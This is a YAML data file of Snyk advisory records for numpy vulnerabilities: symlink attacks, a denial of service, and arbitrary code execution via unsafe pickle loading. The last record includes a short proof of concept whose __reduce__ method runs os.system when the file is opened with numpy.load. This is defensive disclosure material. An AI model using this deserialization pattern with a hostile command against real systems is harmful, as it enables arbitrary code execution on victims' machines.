---
- id: snykio:pypi:numpy:40268
  title: SymLink Attack
  description: |
    [`numpy`][1] is a array processing for numbers, strings, records, and
    objects. \' Affected versions of this package are vulnerable to Symlink
    attacks.



    [1]: https://pypi.python.org/pypi/numpy
  affected_package: numpy
  vulnerable_versions:
  - "< 1.8.1"
  severity: medium
  package_manager: pypi
  cve:
  - CVE-2014-1858
  cwe:
  - CWE-377
  disclosed_date: 2014-02-06
  created_date: 2014-02-06
  last_modified_date: 2014-02-06
  credit:
  - Julian Taylor
  references:
  - https://github.com/numpy/numpy/commit/0bb46c1448b0d3f5453d5182a17ea7ac5854ee15
  - https://github.com/numpy/numpy/pull/4262
  source_url: https://snyk.io/vuln/SNYK-PYTHON-NUMPY-40268
- id: snykio:pypi:numpy:42064
  title: Denial of Service (DoS)
  description: |+
    [numpy][1] is a package for scientific computing with Python.

    Affected versions of this package are vulnerable to Denial of Service
    (DoS)due to missing input validation. An empty list or an array will
    stick into an infinite loop.



    [1]: https://github.com/numpy/numpy
    \nDenial of Service (DoS) describes a family of attacks, all aimed at
    making a system inaccessible to its intended and legitimate users.

    Unlike other vulnerabilities, DoS attacks usually do not aim at
    breaching security. Rather, they are focused on making websites and
    services unavailable to genuine users resulting in downtime.

    One popular Denial of Service vulnerability is DDoS (a Distributed
    Denial of Service), an attack that attempts to clog network pipes to the
    system by generating a large volume of traffic from many machines.

    When it comes to open source libraries, DoS vulnerabilities allow
    attackers to trigger such a crash or crippling of the service by using a
    flaw either in the application code or from the use of open source
    libraries.

    Two common types of DoS vulnerabilities:

    * High CPU/Memory Consumption- An attacker sending crafted requests that
      could cause the system to take a disproportionate amount of time to
      process. For example,
      [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

    * Crash - An attacker sending crafted requests that could cause the
      system to crash. For Example, [npm `ws` package](npm:ws:20171108)

  affected_package: numpy
  vulnerable_versions:
  - "< 1.13.3"
  severity: high
  package_manager: pypi
  cve:
  - CVE-2017-12852
  cwe:
  - CWE-399
  disclosed_date: 2017-08-15
  created_date: 2018-02-25
  last_modified_date: 2018-02-25
  credit:
  - Unknown
  references:
  - https://github.com/numpy/numpy/issues/9560#issuecomment-322395292
  - https://nvd.nist.gov/vuln/detail/CVE-2017-12852
  source_url: https://snyk.io/vuln/SNYK-PYTHON-NUMPY-42064
- id: snykio:pypi:numpy:42067
  title: Symlink Attack
  description: |
    [numpy][1] is a package needed for scientific computing with Python.

    Affected versions of this package are vulnerable to Symlink Attack. It
    allows local users to write to arbitrary files via a symlink attack on a
    temporary file.



    [1]: https://github.com/numpy/numpy
  affected_package: numpy
  vulnerable_versions:
  - "< 1.8.2"
  severity: medium
  package_manager: pypi
  cve:
  - CVE-2014-1859
  cwe:
  - CWE-59
  disclosed_date: 2014-02-06
  created_date: 2018-02-25
  last_modified_date: 2018-02-25
  credit:
  - Unknown
  references:
  - https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737778
  - https://github.com/numpy/numpy/commit/0bb46c1448b0d3f5453d5182a17ea7ac5854ee15
  - https://github.com/numpy/numpy/pull/4262
  - https://nvd.nist.gov/vuln/detail/CVE-2014-1859
  source_url: https://snyk.io/vuln/SNYK-PYTHON-NUMPY-42067
- id: snykio:pypi:numpy:73513
  title: Arbitrary Code Execution
  description: "[numpy][1] is a fundamental package needed for scientific computing
    with\nPython.\n\nAffected versions of this package are vulnerable to Arbitrary
    Code\nExecution. It uses the pickle Python module unsafely, which allows\nremote
    attackers to execute arbitrary code via a crafted serialized\nobject, as demonstrated
    by a `numpy.load` call.\n\nPoC by nanshihui:\n\n    import numpy\n    from numpy
    import __version__\n    print __version__\n    import os\n    import  pickle\n
    \   class Test(object):\n        def __init__(self):\n            self.a = 1\n
    \   \n        def __reduce__(self):\n            return (os.system,('ls',))\n
    \   tmpdaa = Test()\n    with open(\"a-file.pickle\",'wb') as f:\n        pickle.dump(tmpdaa,f)\n
    \   numpy.load('a-file.pickle')\n{: .language-py}\n\n\n\n[1]: https://github.com/numpy/numpy\n"
  affected_package: numpy
  vulnerable_versions:
  - ">= 0"
  severity: high
  package_manager: pypi
  cve:
  - CVE-2019-6446
  cwe:
  - CWE-94
  disclosed_date: 2019-01-16
  created_date: 2019-01-16
  last_modified_date: 2019-01-16
  credit:
  - nanshihui
  references:
  - https://github.com/numpy/numpy/issues/12759
  source_url: https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513
